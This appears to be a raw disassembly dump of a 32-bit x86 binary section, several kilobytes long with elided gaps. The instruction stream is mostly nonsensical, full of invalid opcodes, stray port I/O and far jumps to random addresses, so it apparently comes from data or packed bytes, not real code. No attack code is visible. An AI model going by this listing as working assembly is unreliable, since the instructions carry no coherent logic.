  414003:	stos   BYTE PTR es:[edi],al
  414004:	jle    0x413fb0
  414006:	arpl   WORD PTR [esi],cx
  414008:	and    al,0xd9
  41400a:	pop    ss
  41400b:	into   
  41400c:	mov    dl,0x35
  41400e:	jb     0x413fa3
  414010:	push   ss
  414011:	mul    BYTE PTR [ebx]
  414013:	sub    cl,ch
  414015:	add    BYTE PTR [ebx-0x3bf49621],al
  41401b:	mov    ebx,DWORD PTR ds:0x6a8e2031
  414021:	inc    esi
  414022:	push   edx
  414023:	in     eax,dx
  414024:	xchg   esi,eax
  414025:	iret   
  414026:	call   0xf5fa7872
  41402b:	lds    ebx,FWORD PTR [esi]
  41402d:	push   cs
  41402e:	ret    
  41402f:	jo     0x413fcf
  414031:	inc    esp
  414032:	inc    esp
  414033:	mov    edx,0x9f61cccd
  414038:	sub    edi,DWORD PTR [edi]
  41403a:	adc    cl,ch
  41403c:	xor    DWORD PTR [ebp+0x49],esp
  41403f:	icebp  
  414040:	dec    edx
  414041:	jecxz  0x414053
  414043:	push   ds
  414044:	dec    ebx
  414045:	sbb    eax,0x9065eb5a
  41404a:	or     al,BYTE PTR [esi+0x74019604]
  414050:	sbb    edx,DWORD PTR [esi+0x56]
  414053:	mov    WORD PTR [ebp-0x4c921e6d],ss
  414059:	adc    eax,0xb8355826
  41405e:	int    0x1b
  414060:	sbb    DWORD PTR [ebx+0x74066396],0x20
  414067:	cmp    cl,BYTE PTR [esi+0x44]
  41406a:	outs   dx,DWORD PTR ds:[esi]
  41406b:	call   0x414110
	...
  4140d4:	add    BYTE PTR [eax],al
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xfd88:0xcad52e96
  4140e5:	adc    al,0x66
  4140e7:	fadd   DWORD PTR [eax]
  4140e9:	add    bh,bh
  4140eb:	add    BYTE PTR [eax],al
  4140ed:	add    BYTE PTR [edx+0x5a],cl
  4140f0:	call   0xf0a5:0x836e94ca
  4140f7:	add    bl,BYTE PTR [edi+0x3a]
  4140fa:	fucomi st,st(2)
  4140fc:	shr    BYTE PTR [edx+0x396c28ed],0x47
  414103:	push   0x61
  414105:	dec    edi
  414106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414107:	ins    DWORD PTR es:[edi],dx
  414108:	fist   WORD PTR ds:0x2c699e43
  41410e:	push   edx
  41410f:	xchg   esp,eax
  414110:	jo     0x4140d2
  414112:	shl    BYTE PTR [ebx],1
  414114:	icebp  
  414115:	push   ebp
  414116:	out    dx,eax
  414117:	scas   al,BYTE PTR es:[edi]
  414118:	rcr    BYTE PTR ss:[esi],cl
  41411b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41411c:	fist   WORD PTR [edx+0x3d7d2e9b]
  414122:	repnz nop
  414124:	sahf   
  414125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414126:	sar    BYTE PTR [esi-0x4c3c0cef],0x2
  41412d:	cmp    eax,0xa55ead1
  414132:	jns    0x4140d4
  414134:	inc    ecx
  414135:	sub    al,0x87
  414137:	xor    DWORD PTR [edx-0x1960e37],edx
  41413d:	pusha  
  41413e:	dec    esi
  41413f:	xchg   ecx,eax
  414140:	adc    edx,ebx
  414142:	or     DWORD PTR cs:[esi],edx
  414145:	leave  
  414146:	mov    dl,0xb8
  414148:	and    BYTE PTR [edx+0x221b619b],ah
  41414e:	test   BYTE PTR [eax-0x71],al
  414151:	shl    BYTE PTR [ecx-0xd8bd35c],1
  414157:	inc    esp
  414158:	cdq    
  414159:	int3   
  41415a:	xchg   edx,eax
  41415b:	stos   BYTE PTR es:[edi],al
  41415c:	loop   0x4141c5
  41415e:	dec    edx
  41415f:	dec    esp
  414160:	mov    bh,0xfd
  414162:	sar    BYTE PTR [edx-0xd],cl
  414165:	mov    ds:0xa0fc3fe1,eax
  41416a:	(bad)  
  41416b:	push   edi
  41416c:	mov    bl,0x7
  41416e:	lea    ecx,[eax-0x666f92fb]
  414174:	mov    ds:0x21e9da16,eax
  414179:	pop    esp
  41417a:	push   es
  41417b:	add    eax,0xefc6cd65
  414180:	push   ebx
  414181:	mov    BYTE PTR es:[eax+0x25c56eb3],cl
  414188:	ja     0x4141cb
  41418a:	adc    al,0x79
  41418c:	sub    eax,DWORD PTR [edi+ebx*2-0x3cb19d5a]
  414193:	dec    esp
  414194:	scas   al,BYTE PTR es:[edi]
  414195:	into   
  414196:	xor    ebp,DWORD PTR [eax+0x6b]
  414199:	push   ecx
  41419a:	adc    eax,0xeca1a375
  41419f:	and    bl,BYTE PTR [edi+0x3a]
  4141a2:	aaa    
  4141a3:	mov    ds:0xfa2851a0,al
  4141a8:	or     DWORD PTR [ebp-0x412ef47c],eax
  4141ae:	std    
  4141af:	outs   dx,BYTE PTR ds:[esi]
  4141b0:	shl    DWORD PTR [eax-0x7fa61688],0xfc
  4141b7:	mov    al,0xc
  4141b9:	stos   DWORD PTR es:[edi],eax
  4141ba:	add    esp,esp
  4141bc:	fwait
  4141bd:	aad    0x44
  4141bf:	iret   
  4141c0:	push   esi
  4141c1:	clc    
  4141c2:	jmp    0x17f5:0xafad7a33
  4141c9:	add    dl,BYTE PTR [eax+0x27e51a3]
  4141cf:	jecxz  0x4141db
  4141d1:	mov    edx,0xe845b15f
  4141d6:	lahf   
  4141d7:	sub    ecx,DWORD PTR [ebx]
  4141d9:	mov    edi,0xd8b1709a
  4141de:	cmc    
  4141df:	sbb    al,al
  4141e1:	dec    ebp
  4141e2:	jae    0x414262
  4141e4:	addr16 retf 
  4141e6:	push   esp
  4141e7:	ret    
  4141e8:	enter  0xa20,0xa
  4141ec:	outs   dx,DWORD PTR ds:[esi]
	...
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	pop    ebp
  414263:	popf   
  414264:	gs popf 
  414266:	fld    DWORD PTR gs:[eax]
  414269:	add    bh,bh
  41426b:	add    BYTE PTR [eax],al
  41426d:	add    bl,bl
  41426f:	add    DWORD PTR [edi],edi
  414271:	lods   al,BYTE PTR ds:[esi]
  414272:	and    al,0x33
  414274:	(bad)  
  414275:	iret   
  414276:	cmp    DWORD PTR [esi],ecx
  414278:	jmp    0x8a4f69d9
  41427d:	ret    
  41427e:	adc    DWORD PTR [ecx-0x1c],0x61
  414282:	cmp    DWORD PTR [edi],ecx
  414284:	ss mov bl,0x98
  414287:	xchg   ebp,eax
  414288:	xor    al,0x14
  41428a:	test   eax,ebp
  41428c:	mov    esp,0xaa7fa53a
  414291:	jge    0x414259
  414293:	fwait
  414294:	outs   dx,BYTE PTR ds:[esi]
  414295:	fidivr WORD PTR [edi+0x7d8b9185]
  41429b:	call   0xe6c29446
  4142a0:	and    al,0x18
  4142a2:	out    dx,al
  4142a3:	(bad)  
  4142a5:	mov    al,ds:0xf49398f4
  4142aa:	pop    es
  4142ab:	aas    
  4142ac:	or     DWORD PTR [edi*1-0x14b6f5f6],eax
  4142b3:	inc    ebp
  4142b4:	(bad)  [eax]
  4142b6:	pop    edi
  4142b7:	inc    edi
  4142b8:	push   ss
  4142b9:	neg    BYTE PTR [esi+ebp*2]
  4142bc:	push   ebp
  4142bd:	jnp    0x414331
  4142bf:	imul   edi,DWORD PTR [esi+0x533bad2e],0xffffffd0
  4142c6:	ins    BYTE PTR es:[edi],dx
  4142c7:	aam    0xc4
  4142c9:	jae    0x414258
  4142cb:	not    esp
  4142cd:	dec    esi
  4142ce:	call   0x7904321a
  4142d3:	or     eax,0xc141e180
  4142d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142d9:	or     BYTE PTR [edx-0x2b],bh
  4142dc:	pop    esp
  4142dd:	mov    eax,ds:0x601818d7
  4142e2:	add    BYTE PTR [esi+0xa],0x58
  4142e6:	gs scas eax,DWORD PTR es:[edi]
  4142e8:	pop    ds
  4142e9:	fild   QWORD PTR [ebp+0x7a]
  4142ec:	and    dh,BYTE PTR [eax+edi*1-0x46]
  4142f0:	mov    ds:0x36ae681e,eax
  4142f5:	in     eax,dx
  4142f6:	int3   
  4142f7:	inc    ebp
  4142f8:	into   
  4142f9:	cli    
  4142fa:	or     eax,0x2224d7c1
  4142ff:	cmp    edx,DWORD PTR [ecx+0x54]
  414302:	dec    ebx
  414303:	inc    edi
  414304:	push   0xb2c81b52
  414309:	imul   ebx,DWORD PTR [ebp+0x7b],0x29
  41430d:	mov    al,ds:0x24729963
  414312:	xchg   ebx,eax
  414313:	or     eax,0xc0aae1b5
  414318:	icebp  
  414319:	mov    edi,0xdf195094
  41431e:	push   cs
  41431f:	jb     0x4142c9
  414321:	cmp    eax,0x22c8a288
  414326:	pop    ds
  414327:	push   0x2ccc7d03
  41432c:	test   DWORD PTR [eax],ebx
  41432e:	pop    edi
  41432f:	push   ss
  414330:	fwait
  414331:	dec    ebx
  414332:	jmp    0x4142d7
  414334:	inc    ebp
  414335:	sqrtps xmm0,XMMWORD PTR [eax-0xa]
  414339:	jnp    0x414370
  41433b:	je     0x414329
  41433d:	popf   
  41433e:	aad    0x8a
  414340:	sub    BYTE PTR [eax+0x109daeed],dh
  414346:	fwait
  414347:	loop   0x414365
  414349:	jnp    0x4143c9
  41434b:	call   0xef73:0x117d96
  414352:	enter  0x7839,0xaf
  414356:	mov    ecx,0x698b0064
  41435b:	jnp    0x414330
  41435d:	and    edx,DWORD PTR [eax]
  41435f:	mov    ebx,0x2aa54d0c
  414364:	dec    ebx
  414365:	imul   edx,DWORD PTR [ebp+0x2c],0x253ffbb3
  41436c:	add    BYTE PTR es:[eax],al
	...
  4143d3:	add    BYTE PTR [eax],al
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	sbb    esi,DWORD PTR [edi-0x259bd443]
  4143e8:	add    BYTE PTR [eax],al
  4143ea:	inc    DWORD PTR [eax]
  4143ec:	add    BYTE PTR [eax],al
  4143ee:	aam    0xcc
  4143f0:	xchg   esp,eax
  4143f1:	stc    
  4143f2:	lds    esp,FWORD PTR ds:0x50a9c0ae
  4143f8:	jb     0x414383
  4143fa:	mov    al,ds:0x532ca90c
  4143ff:	popa   
  414400:	mov    bl,BYTE PTR [edi-0x893f30a]
  414406:	(bad)  
  414407:	outs   dx,BYTE PTR ds:[esi]
  414408:	outs   dx,BYTE PTR ds:[esi]
  414409:	mov    edi,0x95e59310
  41440e:	sbb    eax,0x69d9a886
  414413:	fimul  WORD PTR gs:[edi+0x76]
  414417:	or     ebp,DWORD PTR [esi-0x6758dd2]
  41441d:	or     al,0x57
  41441f:	in     al,0xcf
  414421:	or     BYTE PTR [ebx-0x35],ah
  414424:	popf   
  414425:	imul   ebp,esi,0x2d036155
  41442b:	rcr    BYTE PTR [edx+edx*4-0x7c4cfc06],0x65
  414433:	in     eax,dx
  414434:	sbb    eax,0x54a93794
  414439:	jne    0x4143db
  41443b:	rol    BYTE PTR ds:0x272d0202,1
  414441:	jnp    0x414460
  414443:	sub    eax,0x673ff0cc
  414448:	das    
  414449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41444a:	or     DWORD PTR [esi+ecx*2],ebx
  41444d:	cmc    
  41444e:	or     eax,0x6599d11c
  414453:	sub    BYTE PTR [edi],ch
  414455:	lods   eax,DWORD PTR ds:[esi]
  414456:	and    dh,BYTE PTR [ebx+0x2b]
  414459:	mov    ah,0x87
  41445b:	cdq    
  41445c:	push   esi
  41445d:	xchg   ebp,eax
  41445e:	push   ss
  41445f:	loopne 0x4144c2
  414461:	mov    ebx,0xe25f184d
  414466:	les    edi,FWORD PTR [ebp+0x6b59a8ef]
  41446c:	test   eax,0x4498191c
  414471:	xchg   ebx,eax
  414472:	std    
  414473:	sbb    BYTE PTR [ecx],0xfe
  414476:	mov    bl,ch
  414478:	das    
  414479:	rcr    BYTE PTR [esi+ebx*4],cl
  41447c:	push   0xffffffd5
  41447e:	outs   dx,DWORD PTR ds:[esi]
  41447f:	jecxz  0x41449d
  414481:	loopne 0x4144b5
  414483:	jnp    0x41444d
  414485:	outs   dx,BYTE PTR ds:[esi]
  414486:	cdq    
  414487:	or     bl,ah
  414489:	arpl   bx,cx
  41448b:	fidivr WORD PTR [ebx]
  41448d:	jl     0x4144a4
  41448f:	adc    eax,0xa5099878
  414494:	iret   
  414495:	adc    al,0x51
  414497:	add    al,0x29
  414499:	xchg   DWORD PTR [esi],ebx
  41449b:	pop    edi
  41449c:	push   cs
  41449d:	ss xchg edi,eax
  41449f:	stc    
  4144a0:	fist   DWORD PTR [esi-0x10]
  4144a3:	cld    
  4144a4:	test   al,0xbe
  4144a6:	(bad)  
  4144a7:	mov    dl,0xb
  4144a9:	xchg   BYTE PTR [ebp-0x32a542f7],cl
  4144af:	aaa    
  4144b0:	int3   
  4144b1:	sub    al,0xd5
  4144b3:	xchg   BYTE PTR [esi-0x35],dl
  4144b6:	test   eax,0xe183aeda
  4144bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144bc:	stos   DWORD PTR es:[edi],eax
  4144bd:	xchg   edi,eax
  4144be:	std    
  4144bf:	popa   
  4144c0:	jg     0x4144c6
  4144c2:	mov    ds:0xe88cb6ee,al
  4144c7:	and    ch,al
  4144c9:	out    0xe1,eax
  4144cb:	outs   dx,BYTE PTR ds:[esi]
  4144cc:	repnz out dx,al
  4144ce:	mov    dh,0x8c
  4144d1:	mov    edi,0xaacdc882
  4144d6:	or     ebp,DWORD PTR [ecx-0x6ef39046]
  4144dc:	jnp    0x41446c
  4144de:	xor    eax,0x22a69c25
  4144e3:	call   0x7f9f7bdf
  4144e8:	pop    ds
  4144e9:	add    eax,0x694297
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x23]
  414563:	adc    al,0x1f
  414565:	mov    ds:0xdb63,eax
  41456a:	inc    DWORD PTR [eax]
  41456c:	add    BYTE PTR [eax],al
  41456e:	pusha  
  41456f:	inc    ebx
  414570:	mov    esi,0xa4d11107
  414575:	or     al,0x25
  414577:	outs   dx,BYTE PTR ds:[esi]
  414578:	xor    al,0x49
  41457a:	or     DWORD PTR [edx-0x79b4634],esi
  414580:	jae    0x414523
  414582:	jg     0x414557
  414584:	pop    edi
  414585:	aas    
  414586:	mov    BYTE PTR [eax],dh
  414588:	(bad)  
  414589:	dec    ecx
  41458a:	sub    ebx,edi
  41458c:	or     BYTE PTR [ecx-0x5e45eb56],bl
  414592:	xchg   DWORD PTR [ebx+0x41],ebp
  414595:	mov    edi,DWORD PTR [edx+ebp*2-0x7b95db17]
  41459c:	sbb    dh,ch
  41459e:	push   cs
  41459f:	inc    edx
  4145a0:	pop    ss
  4145a1:	xlat   BYTE PTR ds:[ebx]
  4145a2:	dec    edi
  4145a3:	xchg   ecx,eax
  4145a4:	sub    edi,esi
  4145a6:	mov    eax,0x47c546c4
  4145ab:	or     esp,DWORD PTR [ecx]
  4145ad:	popa   
  4145ae:	add    DWORD PTR [edx+ecx*8-0x6419a54f],0x73
  4145b6:	cld    
  4145b7:	out    0xea,al
  4145b9:	jmp    0x5496:0x4d74faf1
  4145c0:	sub    eax,edi
  4145c2:	or     al,0xef
  4145c4:	mov    ah,0x31
  4145c6:	ins    BYTE PTR es:[edi],dx
  4145c7:	stc    
  4145c8:	arpl   WORD PTR [edi+0x58c42783],bx
  4145ce:	sub    esi,DWORD PTR [edi]
  4145d0:	les    ecx,FWORD PTR [edi+0x8]
  4145d3:	leave  
  4145d4:	sti    
  4145d5:	xchg   edi,eax
  4145d6:	in     al,dx
  4145d7:	in     al,0x67
  4145d9:	mov    bh,0xf4
  4145db:	gs and eax,0xa115de60
  4145e1:	clc    
  4145e2:	jecxz  0x4145e8
  4145e4:	cmp    al,0x98
  4145e6:	stos   DWORD PTR es:[edi],eax
  4145e7:	or     al,BYTE PTR [ebx+0x3de95602]
  4145ed:	pop    edx
  4145ee:	xor    cl,0xf9
  4145f1:	aam    0x8b
  4145f3:	push   0x4d
  4145f5:	retf   
  4145f6:	fsub   DWORD PTR [eax]
  4145f8:	jmp    0x414603
  4145fa:	push   ebx
  4145fb:	mul    DWORD PTR [ebx+0x6b]
  4145fe:	xlat   BYTE PTR ds:[ebx]
  4145ff:	cmc    
  414600:	rcl    DWORD PTR fs:[edi+eiz*8],0x9e
  414605:	sub    al,al
  414607:	fadd   QWORD PTR [edi+0x75]
  41460a:	add    DWORD PTR ds:0xccee7ad7,edx
  414610:	fisttp QWORD PTR [ebx-0x15d0c20a]
  414616:	sub    edi,0xd8e9779b
  41461c:	inc    esi
  41461d:	dec    ebp
  41461e:	or     cl,BYTE PTR [esi+0x374feffb]
  414624:	inc    ebp
  414625:	and    BYTE PTR [ebx-0x52],dl
  414628:	mov    ah,cl
  41462a:	loope  0x4146a5
  41462c:	pop    ds
  41462d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41462e:	in     eax,dx
  41462f:	pop    ebx
  414630:	idiv   eax
  414632:	or     ebx,edx
  414634:	shl    esp,cl
  414636:	jp     0x414675
  414638:	adc    eax,0x6b4f1506
  41463d:	sti    
  41463e:	into   
  41463f:	add    DWORD PTR [esi-0x5375be21],ebp
  414645:	aaa    
  414646:	mov    BYTE PTR [edx],dh
  414648:	push   edi
  414649:	jp     0x414632
  41464b:	outs   dx,BYTE PTR ds:[esi]
  41464c:	daa    
  41464d:	leave  
  41464e:	int3   
  41464f:	push   cs
  414650:	retf   0xd6aa
  414653:	rcr    BYTE PTR [edx],1
  414655:	jne    0x414656
  414657:	fild   WORD PTR [ebx+0x14]
  41465a:	arpl   ax,di
  41465c:	jne    0x414673
  41465e:	adc    DWORD PTR [ecx+0x4d],0x34
  414662:	or     DWORD PTR [ecx],eax
  414664:	ror    BYTE PTR [edx+eiz*1],0x78
  414668:	jns    0x414604
  41466a:	clc    
  41466b:	test   al,dl
	...
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0xe9
  4146e3:	push   0xffffff9a
  4146e5:	(bad)  
  4146e6:	(bad)  
  4146e7:	fadd   QWORD PTR [eax]
  4146e9:	add    bh,bh
  4146eb:	add    BYTE PTR [eax],al
  4146ed:	add    BYTE PTR [edx+eax*4],al
  4146f0:	aad    0xaf
  4146f2:	add    al,0x1c
  4146f4:	adc    eax,DWORD PTR [edi]
  4146f6:	xor    eax,0x266d3c51
  4146fb:	xchg   ebp,eax
  4146fc:	mov    bl,0x9e
  4146fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ff:	mov    bl,0xef
  414701:	and    eax,0x4f8f23d4
  414706:	imul   edx,DWORD PTR [ebx+ecx*8+0x176e1e6b],0xf
  41470e:	leave  
  41470f:	pop    esi
  414710:	add    al,0x7a
  414712:	popf   
  414713:	cmp    BYTE PTR [ebx+0x56ddf5cd],bl
  414719:	xchg   edi,eax
  41471a:	rcl    BYTE PTR [esp+ebx*2-0x76],cl
  41471e:	stos   BYTE PTR es:[edi],al
  41471f:	push   0x11272c80
  414724:	add    BYTE PTR [ecx+0x62],ah
  414727:	loopne 0x41470d
  414729:	push   0xffffff87
  41472b:	ficom  WORD PTR [esi-0x75]
  41472e:	and    BYTE PTR [eax+0x77afcc7f],al
  414734:	dec    esi
  414735:	scas   al,BYTE PTR es:[edi]
  414736:	mov    dl,0xe9
  414738:	mov    al,0x5
  41473a:	pusha  
  41473b:	adc    ebx,edx
  41473d:	leave  
  41473e:	push   0xffffff88
  414740:	(bad)  
  414741:	aam    0x2c
  414743:	call   0xbfc:0x44fe98f5
  41474a:	xchg   ecx,edx
  41474c:	or     ecx,0x5a2077e0
  414752:	xchg   DWORD PTR [ebp+edi*1-0x7cffcd71],ebx
  414759:	rcr    ebp,0xa1
  41475c:	dec    esp
  41475d:	cwde   
  41475e:	cmc    
  41475f:	loopne 0x414780
  414761:	push   cs
  414762:	xchg   esp,eax
  414763:	(bad)  
  414764:	jmp    0xb331:0x41c8fe6d
  41476b:	jmp    0x19117d0a
  414770:	jg     0x4147e9
  414772:	ja     0x4147c3
  414774:	inc    ecx
  414775:	xchg   DWORD PTR [ebx+0x558472ce],edi
  41477b:	es arpl dx,ax
  41477e:	outs   dx,BYTE PTR ds:[esi]
  41477f:	and    BYTE PTR [esi+edx*1-0x2d900694],cl
  414786:	inc    ebp
  414787:	and    al,0x3b
  414789:	cmp    edi,esp
  41478b:	xor    ch,BYTE PTR [ebx-0x1e7323a3]
  414791:	fild   QWORD PTR [edx+0x7fc3eac2]
  414797:	mov    BYTE PTR [eax],0x4e
  41479a:	push   0x27
  41479c:	dec    ebp
  41479d:	add    BYTE PTR [ebx+0x2c],ch
  4147a0:	or     bl,BYTE PTR [esi+0x150c613]
  4147a6:	imul   ebp,DWORD PTR [ebp*4+0x32bb1d70],0x9de90dbe
  4147b1:	pop    ds
  4147b2:	pop    esp
  4147b3:	daa    
  4147b4:	sbb    eax,0xf7d59b12
  4147b9:	adc    eax,0xb1f19998
  4147be:	test   BYTE PTR [ebx+0x12],bl
  4147c1:	iret   
  4147c2:	jge    0x4147fe
  4147c4:	into   
  4147c5:	xlat   BYTE PTR ds:[ebx]
  4147c6:	and    BYTE PTR [ecx+0x6667ba19],al
  4147cc:	daa    
  4147cd:	lds    ebp,FWORD PTR [ecx+0x62fb85b0]
  4147d3:	int    0xe5
  4147d5:	jne    0x414823
  4147d7:	loope  0x4147d9
  4147d9:	mov    ds:0x33125adf,al
  4147de:	lock mov esp,0xd9e7a115
  4147e4:	mov    edx,0x3cfdf073
  4147e9:	shl    DWORD PTR [edx+esi*8],cl
  4147ec:	pop    ecx
	...
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0xc4c0c79e
  414866:	popa   
  414867:	fld    QWORD PTR [eax]
  414869:	add    bh,bh
  41486b:	add    BYTE PTR [eax],al
  41486d:	add    dl,bl
  41486f:	mov    WORD PTR [ebx-0x73],ss
  414872:	cmovs  esi,DWORD PTR [ecx-0x35d40343]
  414879:	in     eax,0x62
  41487b:	sbb    esp,eax
  41487d:	jbe    0x414876
  41487f:	mov    ecx,0xf6029ead
  414884:	ins    DWORD PTR es:[edi],dx
  414885:	mov    esi,0x4262942a
  41488a:	enter  0x7a3e,0xcf
  41488e:	mov    esi,esp
  414890:	jno    0x4148ed
  414892:	xor    eax,edi
  414894:	out    0x48,eax
  414896:	ss add eax,0x1552c8e8
  41489c:	stos   BYTE PTR es:[edi],al
  41489d:	repz sbb BYTE PTR [edx+0x3ca0aae1],dh
  4148a4:	les    eax,FWORD PTR [edi+0xc]
  4148a7:	mov    ds:0x24d04ac8,eax
  4148ac:	leave  
  4148ad:	int3   
  4148ae:	or     edx,DWORD PTR [edx-0x60d0854a]
  4148b4:	cmp    al,0xec
  4148b6:	jecxz  0x4148e4
  4148b8:	ins    DWORD PTR es:[edi],dx
  4148b9:	gs push eax
  4148bb:	mov    eax,0xb65e8bd8
  4148c0:	push   ebp
  4148c1:	mov    ch,0x45
  4148c3:	inc    edx
  4148c4:	add    ebx,DWORD PTR [ebp+eiz*2-0x143dc16f]
  4148cb:	push   ecx
  4148cc:	ins    DWORD PTR es:[edi],dx
  4148cd:	dec    edi
  4148ce:	cmp    BYTE PTR ds:0xf1b0a4d1,al
  4148d4:	xchg   BYTE PTR [edx],al
  4148d6:	lahf   
  4148d7:	sbb    al,0x20
  4148d9:	aas    
  4148da:	lods   al,BYTE PTR ds:[esi]
  4148db:	call   0x3ccfa366
  4148e0:	and    eax,0x4bc93314
  4148e5:	push   es
  4148e6:	and    ch,ch
  4148e8:	repnz out 0x2,al
  4148eb:	ret    0xf23
  4148ee:	cld    
  4148ef:	scas   eax,DWORD PTR es:[edi]
  4148f0:	mov    ah,0xc
  4148f2:	fcmove st,st(1)
  4148f4:	lods   eax,DWORD PTR ds:[esi]
  4148f5:	pushf  
  4148f6:	mov    bh,0x4f
  4148f8:	xor    al,0x37
  4148fa:	pop    eax
  4148fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148fc:	repz push ss
  4148fe:	adc    eax,0xbc3fc287
  414903:	mov    DWORD PTR [eax-0x3a0d33de],ecx
  414909:	mov    edi,0x5acc5d38
  41490e:	test   BYTE PTR [ebx+esi*4-0x48879a48],dl
  414915:	mov    al,ds:0xa7e9ceaa
  41491a:	aad    0x41
  41491c:	jne    0x414998
  41491e:	pop    ebx
  41491f:	xchg   edi,eax
  414920:	mov    edx,DWORD PTR [eax-0x6cd3d039]
  414926:	sub    eax,0xd9b8364c
  41492b:	mov    ch,0xf4
  41492d:	xchg   ecx,eax
  41492e:	mov    ch,0x3a
  414930:	push   0x3be7ccf2
  414935:	or     al,0x8c
  414937:	iret   
  414938:	add    DWORD PTR [ebp-0x35],edx
  41493b:	and    DWORD PTR [esi+0x77],ebp
  41493e:	mov    bh,0xcf
  414940:	add    DWORD PTR [ebx+0xc],eax
  414943:	mov    ch,0x15
  414945:	xchg   esp,eax
  414946:	push   ecx
  414947:	je     0x414921
  414949:	add    DWORD PTR [ebp+0x5211c1fa],eax
  41494f:	jge    0x41494f
  414951:	xchg   ebp,eax
  414952:	mov    ebp,0x490fe97b
  414957:	and    DWORD PTR [esi+0x4bdb9a],eax
  41495d:	gs leave 
  41495f:	xor    al,0x59
  414961:	jae    0x4148f6
  414963:	mov    bh,0x94
  414965:	pop    esp
  414966:	and    DWORD PTR [ebx+0x17480a6c],ebp
  41496c:	dec    edx
	...
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	fucom  st(6)
  4149e4:	arpl   WORD PTR [eax+0xde60],si
  4149ea:	inc    DWORD PTR [eax]
  4149ec:	add    BYTE PTR [eax],al
  4149ee:	push   ss
  4149ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149f0:	sbb    DWORD PTR [edi-0x2f],edi
  4149f3:	jg     0x414a46
  4149f5:	(bad)  
  4149f6:	or     esi,DWORD PTR [edx+esi*8+0x30]
  4149fa:	cld    
  4149fb:	adc    al,0x21
  4149fd:	outs   dx,BYTE PTR ds:[esi]
  4149fe:	dec    eax
  4149ff:	ret    0xc2e9
  414a02:	dec    esp
  414a03:	xchg   ebx,eax
  414a04:	ins    DWORD PTR es:[edi],dx
  414a05:	test   BYTE PTR [edi],cl
  414a07:	loope  0x4149cb
  414a09:	int3   
  414a0a:	dec    ebp
  414a0b:	clc    
  414a0c:	enter  0x2c22,0xbb
  414a10:	push   ecx
  414a11:	lds    ecx,FWORD PTR [esi]
  414a13:	out    dx,eax
  414a14:	xchg   ebp,eax
  414a15:	pushf  
  414a16:	fs or  al,0xdb
  414a19:	icebp  
  414a1a:	mov    edx,0x4ba37e32
  414a1f:	(bad)  
  414a20:	adc    dh,dh
  414a22:	xchg   esp,eax
  414a23:	data16 mov al,BYTE PTR [edx]
  414a26:	(bad)  
  414a27:	ins    DWORD PTR es:[edi],dx
  414a28:	lods   al,BYTE PTR ds:[esi]
  414a29:	mov    dl,BYTE PTR [eax-0x580bb62d]
  414a2f:	cmp    al,0xe0
  414a31:	pop    es
  414a32:	sbb    edx,esi
  414a34:	outs   dx,BYTE PTR ds:[esi]
  414a35:	mov    ah,0x1d
  414a37:	jle    0x414a06
  414a39:	and    DWORD PTR [edx-0x1784938a],edi
  414a3f:	jg     0x4149fc
  414a41:	in     eax,dx
  414a42:	stc    
  414a43:	add    eax,0x287334af
  414a48:	nop
  414a49:	mov    ch,0xb0
  414a4b:	in     eax,dx
  414a4c:	(bad)  
  414a4d:	push   ecx
  414a4e:	jnp    0x414a71
  414a50:	cmp    al,0xd9
  414a52:	in     eax,0xf1
  414a54:	push   esp
  414a55:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a57:	pop    ebp
  414a58:	xchg   al,ch
  414a5a:	jb     0x4149f1
  414a5c:	outs   dx,DWORD PTR ds:[esi]
  414a5d:	jbe    0x414a72
  414a5f:	dec    ebp
  414a60:	pop    ecx
  414a61:	cmp    ecx,DWORD PTR [eax-0x14]
  414a64:	test   al,0xc
  414a66:	xlat   BYTE PTR ds:[ebx]
  414a67:	aad    0xbc
  414a69:	test   eax,0x493981dc
  414a6e:	test   al,0x7a
  414a70:	or     BYTE PTR [esi+eiz*1],ch
  414a73:	mov    eax,ds:0x77273b38
  414a78:	stos   DWORD PTR es:[edi],eax
  414a79:	pushf  
  414a7a:	(bad)  
  414a7b:	xor    BYTE PTR [ebp-0x41],bh
  414a7e:	mov    ecx,0x34e26a99
  414a83:	cs push eax
  414a85:	add    dh,BYTE PTR [edi-0x1ec546d]
  414a8b:	test   al,0xc0
  414a8d:	sbb    BYTE PTR [eax-0x75],bh
  414a90:	pop    esp
  414a91:	ja     0x414ae2
  414a93:	xchg   ebp,eax
  414a94:	test   al,0x98
